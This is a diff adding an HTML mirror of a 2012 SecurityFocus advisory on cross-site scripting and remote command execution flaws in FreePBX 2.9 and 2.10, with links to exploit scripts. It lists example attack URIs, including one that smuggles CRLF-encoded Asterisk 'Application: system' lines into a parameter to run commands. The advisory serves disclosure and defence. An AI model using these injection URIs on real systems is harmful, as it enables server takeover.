@@ -1,0 +1,104 @@
+#SpeeDr00t@Black Falcon<br>#bid52630<p><b><span style="font-size: 18pt;">FreePBX Multiple Cross Site Scripting and Remote Command Execution Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/52630/info">info</a><br><a href="http://www.securityfocus.com/bid/52630/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/52630/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/52630/solution">solution</a><br><a href="http://www.securityfocus.com/bid/52630/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				52630
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2012-4869<br/>
+				
+					CVE-2012-4870<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 20 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 06 2012 10:30PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Martin Tschirsich
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					freePBX freePBX 2.10 <br/>
+					
+				
+					freePBX freePBX 2.9 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x53000/52630/52630.py">#exploit_52630.py</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x53000/52630/52630.rb">#exploit_52630.rb</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit the cross-site scripting issues by enticing an unsuspecting victim to follow a malicious URI.   <br/> <br/>The following example input and URIs are available:   <br/> <br/>Cross-site scripting:   <br/> <br/>http://www.example.com//panel/index_amp.php?context=XSS    <br/>http://www.example.com//panel/flash/mypage.php?clid=XSS    <br/>http://www.example.com//panel/flash/mypage.php?clidname=base64_encode(XSS)    <br/>http://www.example.com//panel/dhtml/index.php?context=/../%00"&amp;gt;XSS    <br/>http://www.example.com//admin/views/freepbx_reload.php/"&amp;lt;/script&amp;gt;XSS    <br/>http://www.example.com//recordings/index.php?login='&amp;gt;XSS <br/> <br/>Command Execution:   <br/> <br/>http://www.example.com//recordings/misc/callme_page.php?action=c&amp;amp;callmenum=PHONENUMBER  ()  from-internal/n%0D%0AApplication:%20system%0D%0AData:%20CMD%0D%0A%0D%0A     <br/> <br/>The following example exploits are available:   <br/> <br/>Command Execution:   
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/52630.py">/data/vulnerabilities/exploits/52630.py</a></li>
+<li><a href="/data/vulnerabilities/exploits/52630.rb">/data/vulnerabilities/exploits/52630.rb</a></li>
+</ul>
+</div>
